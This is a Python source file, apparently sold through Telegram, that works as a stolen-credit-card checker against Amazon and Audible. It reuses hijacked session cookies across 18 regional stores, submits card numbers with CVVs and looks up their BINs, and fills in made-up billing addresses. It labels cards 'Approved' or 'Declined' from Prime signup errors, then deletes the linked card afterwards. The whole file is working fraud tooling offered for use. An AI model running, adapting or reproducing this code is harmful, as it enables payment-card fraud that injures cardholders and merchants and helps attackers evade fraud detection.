# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
import re, random, string, json, time
from typing import Optional, Dict, Any
from curl_cffi.requests import Session
from urllib.parse import urlencode, quote

class Core:

    REFRESH_MESSAGE = 'Cookie expired ❌: Passkey authentication failed, please login again to refresh your cookie!'
    COUNTRY_MAP: Dict[str, Dict[str, str]] = {"ES": {"code": "acbes", "currency": "EUR", "lc": "lc-acbes", "lc_value": "es_ES", "domain": "amazon.es"}, "MX": {"code": "acbmx", "currency": "MXN", "lc": "lc-acbmx", "lc_value": "es_MX", "domain": "amazon.com.mx"}, "IT": {"code": "acbit", "currency": "EUR", "lc": "lc-acbit", "lc_value": "it_IT", "domain": "amazon.it"}, "US": {"code": "main",  "currency": "USD", "lc": "lc-main",  "lc_value": "en_US", "domain": "amazon.com"}, "DE": {"code": "acbde", "currency": "EUR", "lc": "lc-main",  "lc_value": "de_DE", "domain": "amazon.de"}, "BR": {"code": "acbbr", "currency": "BRL", "lc": "lc-main",  "lc_value": "en_US", "domain": "amazon.com.br"}, "AE": {"code": "acbae", "currency": "AED", "lc": "lc-acbae", "lc_value": "en_AE", "domain": "amazon.ae"}, "SG": {"code": "acbsg", "currency": "SGD", "lc": "lc-acbsg", "lc_value": "en_SG", "domain": "amazon.com.sg"}, "SA": {"code": "acbsa", "currency": "SAR", "lc": "lc-acbsa", "lc_value": "ar_AE", "domain": "amazon.sa"}, "CA": {"code": "acbca", "currency": "CAD", "lc": "lc-acbca", "lc_value": "en_CA", "domain": "amazon.ca"}, "PL": {"code": "acbpl", "currency": "PLN", "lc": "lc-acbpl", "lc_value": "pl_PL", "domain": "amazon.pl"}, "AU": {"code": "acbau", "currency": "AUD", "lc": "lc-acbpl", "lc_value": "en_AU", "domain": "amazon.com.au"}, "JP": {"code": "acbjp", "currency": "JPY", "lc": "lc-acbjp", "lc_value": "ja_JP", "domain": "amazon.co.jp"}, "FR": {"code": "acbfr", "currency": "EUR", "lc": "lc-acbfr", "lc_value": "fr_FR", "domain": "amazon.fr"}, "IN": {"code": "acbin", "currency": "INR", "lc": "lc-acbin", "lc_value": "en_IN", "domain": "amazon.in"}, "NL": {"code": "acbnl", "currency": "EUR", "lc": "lc-acbnl", "lc_value": "nl_NL", "domain": "amazon.nl"}, "UK": {"code": "acbuk", "currency": "GBP", "lc": "lc-acbuk", "lc_value": "en_GB", "domain": "amazon.co.uk"}, "TR": {"code": "acbtr", "currency": "TRY", "lc": "lc-acbtr", "lc_value": "tr_TR", "domain": "amazon.com.tr"}}


    @staticmethod
    def splitByDelimiters(delimiters: list[str], value: str) -> list[str]:
        pattern = "|".join(map(re.escape, delimiters))
        return re.split(pattern, value)


    @staticmethod
    def extractBetween(haystack: Optional[str], start: str, end: str, index: int = 1) -> Optional[str]:
        if not haystack: return None
        try: return haystack.split(start)[index].split(end)[0]
        except (IndexError, ValueError): return None
        

    @staticmethod
    def generateRandomLetters(length: int) -> str:
        return "".join(random.choice(string.ascii_lowercase) for _ in range(length))


    @staticmethod
    def extractRegionCode(cookie: str) -> Optional[str]:
        m = re.search(r"\b(main|acb[a-z]{2})\b", cookie, re.I)
        return m.group(1).lower() if m else None

    @classmethod
    def buildCookieData(cls, cookie: str) -> dict:
        region_code = cls.extractRegionCode(cookie.strip())
        if not region_code: return {"status": False, "message": "Region code not found in cookie."}

        country_map = {v["code"]: v for v in cls.COUNTRY_MAP.values()}

        if region_code not in country_map: return { "status": False, "message": f"Unsupported region code in cookie: {region_code}."}

        country = country_map[region_code]
        codes   = [v["code"] for v in cls.COUNTRY_MAP.values()] + ["acbuc"]
        for code in codes: cookie = cookie.replace(code, country["code"])
        cookie = re.sub(r"(i18n-prefs=)[A-Z]{3}",r"\1" + country["currency"],cookie)
        cookie = re.sub(rf"({re.escape(country['lc'])}=)[^;]+",r"\1" + country["lc_value"],cookie)
        return {"status": True, "cookie": cookie, "domain": country["domain"], "country_code": next(k for k, v in cls.COUNTRY_MAP.items() if v == country)}

    @staticmethod
    def buildCookieAudible(cookie: str, country: str = "US") -> str:
        nonBuildCookieData = Core.COUNTRY_MAP[country]
        cookie = re.sub(r"\b(acb[a-z]{2}|main)\b",nonBuildCookieData["code"],cookie)
        cookie = re.sub(r"(i18n-prefs=)[A-Z]{3}",r"\1" + nonBuildCookieData["currency"],cookie)
        return re.sub(rf"({re.escape(nonBuildCookieData['lc'])}=)[a-z]{{2}}_[A-Z]{{2}}",r"\1" + nonBuildCookieData["lc_value"],cookie)

    @staticmethod
    def parseCardString(cardString: str) -> dict | None:
        parts = Core.splitByDelimiters([":", "|", ";", ":", "/", " "], cardString)
        if len(parts) < 4: return {"status": False, "message": "Invalid card format. Expected format: number|exp_month|exp_year|cvv"}
        return {"status": True, "number": parts[0].strip(), "month": parts[1].strip().zfill(2), "year": parts[2].strip(), "cvv": parts[3].strip()}

    @staticmethod
    def createCookieJarFromString(session: Session, cookie: str, domain: str) -> Session:
        for pair in cookie.split(";"):
            if "=" not in pair: continue
            name, value = map(str.strip, pair.split("=", 1))
            session.cookies.set(name, value, domain=domain, path="/")

        return session

    @staticmethod
    def buildFlowBillingResult(response_amazon: str, audible_response: dict, country_code: str, card: dict, final_url: str = "") -> dict:
        # Faithful port of the PHP api.php result classifier.
        card_str   = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        card_resp  = (audible_response or {}).get("message") or ""
        normalized = (response_amazon or "").replace("\u2019", "'").replace("\u2018", "'")
        check      = f"{response_amazon} {final_url}"

        def _out(success: bool, status: str, message: str) -> dict:
            return {"status": True, "success": success,
                    "card": card_str, "card_response": card_resp,
                    "response": message, "apiResponse": status,
                    "gateway": f"Amazon ({country_code.upper()})"}

        def _err(message: str) -> dict:
            return {"status": False, "success": False,
                    "card": card_str, "card_response": card_resp,
                    "response": message, "apiResponse": "Error ⚠️",
                    "gateway": f"Amazon ({country_code.upper()})"}

        if "unable to complete your Prime signup" in normalized or "sorry" in normalized:
            return _out(True, "Approved ✅", "Card successfully linked.")
        if "No podemos completar tu registro en Prime" in response_amazon or "Lo lamentamos" in response_amazon:
            return _out(True, "Approved ✅", "Card successfully linked.")
        if "InvalidInput" in check:
            return _out(False, "Declined ❌", "Invalid card.")
        if "If you would still like to join Prime" in response_amazon or "you can sign up during checkout" in response_amazon:
            return _out(False, "Declined ❌", "Attempt limit reached.")
        if "CustomerValidationFailureException" in check:
            return _out(True, "Approved ✅", "Card successfully linked.")
        if "HARDVET_VERIFICATION_FAILED" in check:
            return _out(False, "Declined ❌", "Card verification failed.")
        if "HardVetCsrfValidationFailed" in check:
            return _err("CSRF expired - Refresh your cookie.")
        return _err("Unknown response from Amazon.")

    @staticmethod
    def getBinInfo(cc: str, session: "Session | None" = None) -> Optional[dict]:
        """Best-effort anti-public BIN lookup → dict or None."""
        bin_digits = re.sub(r"\D", "", cc or "")[:6]
        if len(bin_digits) < 6:
            return None
        try:
            _req = session if session is not None else Session(impersonate="chrome124")
            resp = _req.get(
                f"https://bins.antipublic.cc/bins/{bin_digits}",
                headers={"accept": "application/json",
                         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"},
                timeout=10,
            )
            data = resp.json()
            return data if isinstance(data, dict) else None
        except Exception:
            return None

    @staticmethod
    def final_url_from(response, fallback: str) -> str:
        """Track the effective/final URL of a request (Guzzle redirect-history equivalent)."""
        try:
            history = getattr(response, "history", None) or []
            if history:
                last = history[-1]
                return getattr(last, "url", None) or fallback
            return getattr(response, "url", None) or fallback
        except Exception:
            return fallback



class MetaData:

    @staticmethod
    def getBillingAddressId(session: Session, csrf_token: str, domain: str) -> Optional[str]:
        headers1 = { "Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3A.190605.09261202; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36", "client": "MYXSettings", "Content-Type": "application/x-www-form-urlencoded", "Origin": f"https://www.{domain}", "X-Requested-With": "com.amazon.dee.app", "Referer": f"https://www.{domain}/mn/dcw/myx/settings.html?route=updatePaymentSettings&ref_=kinw_drop_coun&ie=UTF8&client=deeca"}
        payload1 = 'data=%7B%22param%22%3A%7B%22LogPageInfo%22%3A%7B%22pageInfo%22%3A%7B%22subPageType%22%3A%22kinw_total_myk_stb_Perr_paymnt_dlg_cl%22%7D%7D%2C%22GetAllAddresses%22%3A%7B%7D%7D%7D&csrfToken=' + quote(csrf_token)
        request1 = session.post(f"https://www.{domain}/hz/mycd/ajax", headers=headers1, data=payload1)
        return Core.extractBetween(request1 .text, 'AddressId":"', '"')

    
    @staticmethod
    def addBillingAddress(session: Session, domain: str, countryCode: str) -> dict:
        # Multi-country billing address creation (faithful port of PHP api.php),
        # including the address-confirm page handling. Returns {'status', 'message'}.
        COUNTRY_DATA = {
            'US': {'countryCode': 'US', 'fullName': 'Jesus Jenkins', 'phone': '929' + str(random.randint(1000000, 9999999)), 'line1': '42 REMSEN ST APT 41', 'city': 'BROOKLYN', 'state': 'NY', 'postalCode': '11201'},
            'DE': {'countryCode': 'DE', 'fullName': 'Max Mueller', 'phone': '030' + str(random.randint(1000000, 9999999)), 'line1': 'Unter den Linden 10', 'city': 'Berlin', 'state': 'BE', 'postalCode': '10115'},
            'ES': {'countryCode': 'ES', 'fullName': 'Carlos Garcia', 'phone': '91' + str(random.randint(1000000, 9999999)), 'line1': 'Calle de Alcala 50', 'city': 'Madrid', 'state': 'MD', 'postalCode': '28001'},
            'IT': {'countryCode': 'IT', 'fullName': 'Marco Rossi', 'phone': '06' + str(random.randint(10000000, 99999999)), 'line1': 'Via Nazionale 10', 'city': 'Roma', 'state': 'RM', 'postalCode': '00184'},
            'JP': {'countryCode': 'JP', 'fullName': 'Taro Yamada', 'phone': '03' + str(random.randint(10000000, 99999999)), 'line1': '1-1 Chiyoda', 'city': 'Tokyo', 'state': 'Tokyo', 'postalCode': '100-0001'},
            'CA': {'countryCode': 'CA', 'fullName': 'John Smith', 'phone': '416' + str(random.randint(1000000, 9999999)), 'line1': '100 King St W', 'city': 'Toronto', 'state': 'ON', 'postalCode': 'M5V 2T6'},
            'AU': {'countryCode': 'AU', 'fullName': 'Jack Wilson', 'phone': '02' + str(random.randint(1000000, 9999999)), 'line1': '1 George St', 'city': 'Sydney', 'state': 'NSW', 'postalCode': '2000'},
            'BR': {'countryCode': 'BR', 'fullName': 'Joao Silva', 'phone': '11' + str(random.randint(100000000, 999999999)), 'line1': 'Av. Paulista 1000', 'city': 'Sao Paulo', 'state': 'SP', 'postalCode': '01310-100'},
            'MX': {'countryCode': 'MX', 'fullName': 'Juan Perez', 'phone': '55' + str(random.randint(10000000, 99999999)), 'line1': 'Av. Juarez 10', 'city': 'Ciudad de Mexico', 'state': 'CDMX', 'postalCode': '06000'},
            'IN': {'countryCode': 'IN', 'fullName': 'Aarav Sharma', 'phone': '11' + str(random.randint(10000000, 99999999)), 'line1': 'Connaught Pl 10', 'city': 'New Delhi', 'state': 'DL', 'postalCode': '110001'},
            'NL': {'countryCode': 'NL', 'fullName': 'Jan de Vries', 'phone': '020' + str(random.randint(100000, 999999)), 'line1': 'Damrak 1', 'city': 'Amsterdam', 'state': 'NH', 'postalCode': '1011'},
            'SG': {'countryCode': 'SG', 'fullName': 'Wei Lim', 'phone': '65' + str(random.randint(100000, 999999)), 'line1': '1 Raffles Pl', 'city': 'Singapore', 'state': 'SG', 'postalCode': '018956'},
            'AE': {'countryCode': 'AE', 'fullName': 'Ahmed Al Farsi', 'phone': '04' + str(random.randint(1000000, 9999999)), 'line1': 'Sheikh Zayed Rd 1', 'city': 'Dubai', 'state': 'DU', 'postalCode': '00000'},
            'SA': {'countryCode': 'SA', 'fullName': 'Mohammed Al Saud', 'phone': '011' + str(random.randint(100000, 999999)), 'line1': 'King Fahd Rd 100', 'city': 'Riyadh', 'state': 'RU', 'postalCode': '12211'},
            'TR': {'countryCode': 'TR', 'fullName': 'Emre Yilmaz', 'phone': '212' + str(random.randint(1000000, 9999999)), 'line1': 'Istiklal Cd 10', 'city': 'Istanbul', 'state': 'IB', 'postalCode': '34110'},
            'SE': {'countryCode': 'SE', 'fullName': 'Erik Andersson', 'phone': '08' + str(random.randint(1000000, 9999999)), 'line1': 'Drottninggatan 20', 'city': 'Stockholm', 'state': 'AB', 'postalCode': '11157'},
            'PL': {'countryCode': 'PL', 'fullName': 'Jan Kowalski', 'phone': '22' + str(random.randint(1000000, 9999999)), 'line1': 'Krakowskie Przedmiescie 10', 'city': 'Warszawa', 'state': 'MZ', 'postalCode': '00-001'},
            'EG': {'countryCode': 'EG', 'fullName': 'Ahmed Hassan', 'phone': '2' + str(random.randint(100000000, 999999999)), 'line1': 'Tahrir Sq 1', 'city': 'Cairo', 'state': 'C', 'postalCode': '11511'},
        }
        data = COUNTRY_DATA.get(str(countryCode).upper())
        if not data:
            return {'status': False, 'message': 'Country not supported'}

        def _extract_token(html: str, name: str) -> Optional[str]:
            import html as _h
            for pattern in [
                rf'<input[^>]*name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']*)["\']',
                rf'data-{re.escape(name)}=["\']([^"\']*)["\']',
                rf'name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']*)["\']',
            ]:
                m = re.search(pattern, html, re.I)
                if m:
                    return _h.unescape(m.group(1))
            return None

        # Request 1: GET address form
        headers_get = {
            'Host': f'www.{domain}',
            'Referer': f'https://www.{domain}/a/addresses?ref_=ya_d_c_addr&claim_type=EmailAddress&new_account=1&',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Viewport-Width': '1536',
        }
        response1 = session.get(f'https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button', headers=headers_get).text

        csrf = _extract_token(response1, 'csrfToken')
        prev_state = _extract_token(response1, 'address-ui-widgets-previous-address-form-state-token')
        customer_id = _extract_token(response1, 'address-ui-widgets-obfuscated-customerId')
        if not customer_id:
            m = re.search(r'"customerID":"([^"]+)"', response1)
            if m:
                customer_id = m.group(1)
        csrf_widget = _extract_token(response1, 'address-ui-widgets-csrfToken')
        load_start = _extract_token(response1, 'address-ui-widgets-form-load-start-time')
        clickstream = _extract_token(response1, 'address-ui-widgets-clickstream-related-request-id')
        wizard_id = _extract_token(response1, 'address-ui-widgets-address-wizard-interaction-id')
        ajax_token = _extract_token(response1, 'identity-address-ux-ajax-auth-token')

        if not csrf_widget:
            csrf_widget = csrf
        if not load_start:
            load_start = str(int(time.time()))

        missing = []
        if not csrf:      missing.append('csrf')
        if not prev_state: missing.append('prevState')
        if not customer_id: missing.append('customerId')
        if not wizard_id:  missing.append('wizardId')
        if missing:
            return {'status': False, 'message': 'Missing tokens: ' + ', '.join(missing) + ' (maybe cookie expired)'}

        # MX zip autopopulation
        if str(countryCode).upper() == 'MX' and ajax_token:
            try:
                payload2 = json.dumps({'JsonPayload': json.dumps({'operation': 'MexicoAutopopulation', 'data': {'CountryCode': data['countryCode'], 'PostalCode': data['postalCode']}, 'ajaxToken': ajax_token})})
                session.post(f'https://www.{domain}/auiws/perform-ajax', headers={'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/x-www-form-urlencoded', 'Referer': f'https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button'}, data=payload2)
            except Exception:
                pass

        post_data = {
            'csrfToken': csrf, 'addressID': '',
            'address-ui-widgets-countryCode': data['countryCode'],
            'address-ui-widgets-enterAddressFullName': data['fullName'],
            'address-ui-widgets-enterAddressPhoneNumber': data['phone'],
            'address-ui-widgets-enterAddressLine1': data['line1'],
            'address-ui-widgets-enterAddressLine2': '',
            'address-ui-widgets-enterAddressCity': data['city'],
            'address-ui-widgets-enterAddressStateOrRegion': data['state'],
            'address-ui-widgets-enterAddressPostalCode': data['postalCode'],
            'address-ui-widgets-urbanization': '',
            'address-ui-widgets-previous-address-form-state-token': prev_state,
            'address-ui-widgets-use-as-my-default': 'true',
            'address-ui-widgets-addressFormButtonText': 'save',
            'address-ui-widgets-addressFormHideHeading': 'true',
            'address-ui-widgets-heading-string-id': '',
            'address-ui-widgets-addressFormHideSubmitButton': 'false',
            'address-ui-widgets-enableAddressDetails': 'true',
            'address-ui-widgets-returnLegacyAddressID': 'false',
            'address-ui-widgets-enableDeliveryInstructions': 'true',
            'address-ui-widgets-enableAddressWizardInlineSuggestions': 'true',
            'address-ui-widgets-enableEmailAddress': 'false',
            'address-ui-widgets-enableAddressTips': 'true',
            'address-ui-widgets-amazonBusinessGroupId': '',
            'address-ui-widgets-clientName': 'YourAccountAddressBook',
            'address-ui-widgets-enableAddressWizardForm': 'true',
            'address-ui-widgets-ab-delivery-instructions-data': '',
            'address-ui-widgets-address-wizard-interaction-id': wizard_id,
            'address-ui-widgets-obfuscated-customerId': customer_id,
            'address-ui-widgets-locationData': '',
            'address-ui-widgets-enableLatestAddressWizardForm': 'false',
            'address-ui-widgets-avsSuppressSoftblock': 'false',
            'address-ui-widgets-avsSuppressSuggestion': 'false',
            'address-ui-widgets-csrfToken': csrf_widget,
            'address-ui-widgets-form-load-start-time': load_start,
            'address-ui-widgets-clickstream-related-request-id': clickstream or '',
            'address-ui-widgets-deliveryDestinationCity': data['city'],
            'address-ui-widgets-deliveryDestinationNonUciPostalCode': data['postalCode'],
            'address-ui-widgets-autofill-location-spinner-loading-text': 'Loading',
            'address-ui-widgets-locale': '',
        }

        # Japan split postal code into two fields
        if str(countryCode).upper() == 'JP':
            pc_digits = re.sub(r'\D', '', data['postalCode'])
            if len(pc_digits) == 7:
                post_data['address-ui-widgets-enterAddressPostalCodeOne'] = pc_digits[:3]
                post_data['address-ui-widgets-enterAddressPostalCodeTwo'] = pc_digits[3:7]

        post_url = f'https://www.{domain}/a/addresses/add?ref=ya_address_book_add_post'
        headers_post = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': f'www.{domain}',
            'Origin': f'https://www.{domain}',
            'Referer': f'https://www.{domain}/a/addresses/add?ref=ya_address_book_add_button',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'Viewport-Width': '1536',
        }
        response2 = session.post(post_url, headers=headers_post, data=post_data).text

        # Address-confirm handling
        need_confirm = False
        confirm_keywords = ['review your address', 'revisar', 'conferma', 'previsualiser', 'uberprufen', 'revise', 'controlla', 'verifica', 'indirizzo']
        for kw in confirm_keywords:
            if kw.lower() in response2.lower():
                need_confirm = True
                break

        if need_confirm:
            m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', response2, re.I)
            confirm_action = m.group(1) if m else f'https://www.{domain}/a/addresses/confirm'
            if not confirm_action.startswith('http'):
                confirm_action = 'https://www.' + domain + ('' if confirm_action.startswith('/') else '/') + confirm_action
            confirm_data = {}
            for m in re.finditer(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*value=["\']([^"\']*)["\']', response2, re.I):
                confirm_data[m.group(1)] = m.group(2)
            for m in re.finditer(r'<select[^>]*name=["\']([^"\']*)["\'][^>]*>(.*?)</select>', response2, re.I | re.S):
                sel = re.search(r'<option[^>]*selected[^>]*value=["\']([^"\']*)["\']', m.group(2), re.I)
                opt = sel if sel else re.search(r'<option[^>]*value=["\']([^"\']*)["\']', m.group(2), re.I)
                if opt:
                    confirm_data[m.group(1)] = opt.group(1)
            headers_confirm = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': post_url, 'Origin': f'https://www.{domain}',
                'Upgrade-Insecure-Requests': '1',
            }
            final_response = session.post(confirm_action, headers=headers_confirm, data=confirm_data).text
        else:
            final_response = response2

        success_patterns = [
            'Your address has been added', 'Tu direccion ha sido anadida', 'Ihr Adresse wurde hinzugefugt',
            'Il tuo indirizzo e stato aggiunto', 'Votre adresse a ete ajoutee', 'Indirizzo aggiunto con successo',
            'successfully added', 'address was successfully added', 'Your Addresses', 'Tus direcciones', 'Indirizzi',
        ]
        for pattern in success_patterns:
            if pattern.lower() in final_response.lower():
                return {'status': True, 'message': 'Address added successfully'}

        error_msg = 'Failed to add address'
        m = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', final_response, re.I | re.S)
        if not m:
            m = re.search(r'<h4[^>]*>(.*?)</h4>', final_response, re.I | re.S)
        if not m:
            m = re.search(r'<p[^>]*>(.*?)</p>', final_response, re.I | re.S)
        if m:
            error_msg = 'Amazon error: ' + re.sub(r'<[^>]+>', '', m.group(1)).strip()
        return {'status': False, 'message': error_msg}

    @staticmethod
    def deletePaymentMethod(cookie: str, payment: str, proxies: Optional[str] = None, retries: int = 0) -> None:
        try:
            cookie_data = {'cookie': cookie, 'domain': ''}
            tokens = ["audible.de", "audible.it", "audible.es", "audible.co.uk", "audible.com.au", "audible.ca", "audible.com", "audible.co.jp", "audible.fr"]

            for token in tokens:
                cookie_data['domain'] = token
                last_dot_position = cookie_data['domain'].rfind('.')
                country_code = cookie_data['domain'][last_dot_position + 1:] if last_dot_position != -1 else ''
                if country_code == 'com':  country_code = 'US'

                #//! Request 1: Get CSRF Token and Address ID
                cookie = Core.buildCookieAudible(cookie_data['cookie'], country_code.upper())
                headers1 = {"Host": f"www.{cookie_data['domain']}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.9" if country_code not in ['AE', 'SA', 'JP'] else ('en-US,en;q=0.9,ar;q=0.8' if country_code == 'AE' or country_code == 'SA' else 'ja-JP,ja;q=0.9,en;q=0.8'), "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1", "Cookie": cookie}
                request1 = Session(impersonate = random.choice(["chrome124", "chrome123", "safari17_0", "safari17_2_ios", "safari15_3"])).post(f"https://www.{cookie_data['domain']}/account/payments?ref=", headers=headers1)
                csrf = Core.extractBetween(request1.text, 'data-csrf-token="', '"')
                address = Core.extractBetween(request1.text, 'data-billing-address-id="', '"')
                if '///' in csrf: csrf = Core.extractBetween(Core.extractBetween(request1.text, 'data-payment-id="', 'payment-type'), 'data-csrf-token="', '"')

                #//! Request 2: Delete Payment Method
                headers2 = {"Host": f"www.{cookie_data['domain']}", "sec-ch-ua": '"Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"', "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest", "sec-ch-ua-mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36", "sec-ch-ua-platform": "Windows", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "en-US,en;q=0.9,ar;q=0.8" if country_code in ['AE', 'SA'] else ("ja-JP,ja;q=0.9,en;q=0.8" if country_code == 'JP' else "en-US,en;q=0.9"), "Origin": f"https://www.{cookie_data['domain']}", "Referer": f"https://www.{cookie_data['domain']}/account/payments?ref=", "Cookie": cookie}
                payload2 = f"isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId={payment}&billingAddressId={address}&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken={quote(csrf)}&index=0"
                request2 = Session().post(f"https://www.{cookie_data['domain']}/unified-payment/deactivate-payment-instrument", headers=headers2, data=payload2)

                if '"statusStringKey":"adbl_paymentswidget_delete_payment_success"' in request2.text:
                    return {'status': True, 'message': 'Payment method deleted successfully.'}

            return {'status': False, 'message': 'Failed to delete payment method.'}
        except Exception as error:
            if retries < 5:
                return MetaData.deletePaymentMethod(cookie, payment, proxies, retries + 1)
            else:
                return {'status': False, 'message': 'Failed to delete payment method.'}

# ══════════════════════════════════════════════════════════════════════════
#  Coder: t.me/Vxsilisk  -  Shop: t.me/Sxgitario
# ══════════════════════════════════════════════════════════════════════════
